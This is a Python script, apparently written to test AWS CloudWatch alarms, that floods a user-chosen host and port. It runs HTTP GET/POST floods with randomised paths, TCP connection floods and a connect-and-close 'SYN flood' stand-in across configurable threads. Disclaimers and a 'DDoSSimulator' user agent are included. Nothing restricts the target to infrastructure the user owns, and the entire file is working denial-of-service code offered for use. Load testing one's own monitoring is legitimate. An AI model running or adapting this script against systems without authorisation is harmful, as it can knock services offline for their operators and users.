#!/usr/bin/env python3
"""
Simple DDoS Simulation Script for Testing AWS CloudWatch Alarms
WARNING: This is for educational purposes only. Do not use this against servers you don't own.
"""

import argparse
import threading
import time
import random
import socket
import requests
from concurrent.futures import ThreadPoolExecutor

def parse_arguments():
    parser = argparse.ArgumentParser(description='Simple DDoS Simulation Tool')
    parser.add_argument('target', help='Target IP or hostname')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-r', '--rate', type=int, default=5, help='Requests per second per thread (default: 5)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds (default: 60)')
    parser.add_argument('--type', choices=['http', 'tcp', 'syn'], default='http', 
                        help='Attack type: http, tcp, syn (default: http)')
    
    return parser.parse_args()

def http_attack(target, port, rate, duration, thread_id):
    print(f"Thread {thread_id}: Starting HTTP attack")
    end_time = time.time() + duration
    session = requests.Session()
    count = 0
    
    while time.time() < end_time:
        try:
            random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
            random_ua = f"Mozilla/5.0 (Compatible; DDoSSimulator/{random.randint(1, 1000)})"
            
            headers = {
                'User-Agent': random_ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'X-Requested-With': f'DDoSSimulator-{thread_id}'
            }
            
            url = f"http://{target}:{port}{random_path}"
            
            if random.choice([True, False]):  # Mix GET and POST requests
                response = session.get(url, headers=headers, timeout=2)
            else:
                response = session.post(url, headers=headers, data={'data': 'test'}, timeout=2)
                
            count += 1
            if count % 10 == 0:
                print(f"Thread {thread_id}: Sent {count} HTTP requests")
                
        except Exception as e:
            pass
            
        # Sleep to control the rate
        time.sleep(1 / rate)
        
    print(f"Thread {thread_id}: Completed with {count} HTTP requests sent")

def tcp_attack(target, port, rate, duration, thread_id):
    print(f"Thread {thread_id}: Starting TCP connection flood")
    end_time = time.time() + duration
    count = 0
    
    while time.time() < end_time:
        try:
            # Create a socket and connect to the target
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            
            # Send some random data
            random_data = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 100)))
            s.send(random_data.encode())
            
            # Keep the connection open for a short time
            time.sleep(random.uniform(0.1, 1))
            
            # Close the connection
            s.close()
            
            count += 1
            if count % 10 == 0:
                print(f"Thread {thread_id}: Created {count} TCP connections")
                
        except Exception as e:
            pass
            
        # Sleep to control the rate
        time.sleep(1 / rate)
        
    print(f"Thread {thread_id}: Completed with {count} TCP connections created")

def syn_attack(target, port, rate, duration, thread_id):
    print(f"Thread {thread_id}: SYN flood attack simulation")
    print("Note: This is a simulated SYN flood. A real SYN flood would require raw sockets and root privileges.")
    
    # Since we can't easily do a real SYN flood without root and raw sockets,
    # we'll simulate by opening and immediately closing connections
    end_time = time.time() + duration
    count = 0
    
    while time.time() < end_time:
        try:
            # Create a socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            
            # Connect and immediately close to simulate partial connection
            s.connect((target, port))
            s.close()
            
            count += 1
            if count % 10 == 0:
                print(f"Thread {thread_id}: Sent {count} SYN packets (simulated)")
                
        except Exception as e:
            pass
            
        # Sleep to control the rate
        time.sleep(1 / rate)
        
    print(f"Thread {thread_id}: Completed with {count} SYN packets sent (simulated)")

def main():
    args = parse_arguments()
    
    print("="*60)
    print(f"Starting DDoS simulation against {args.target}:{args.port}")
    print(f"Attack type: {args.type}")
    print(f"Threads: {args.threads}")
    print(f"Rate: {args.rate} requests/second per thread")
    print(f"Duration: {args.duration} seconds")
    print("="*60)
    print("WARNING: This tool is for educational purposes only.")
    print("Make sure you have permission to test the target system.")
    print("="*60)
    
    # Select attack function based on type
    attack_func = {
        'http': http_attack,
        'tcp': tcp_attack,
        'syn': syn_attack
    }[args.type]
    
    # Create and start threads
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for i in range(args.threads):
            executor.submit(attack_func, args.target, args.port, args.rate, args.duration, i+1)
    
    print("\nAttack simulation completed.")

if __name__ == "__main__":
    main()
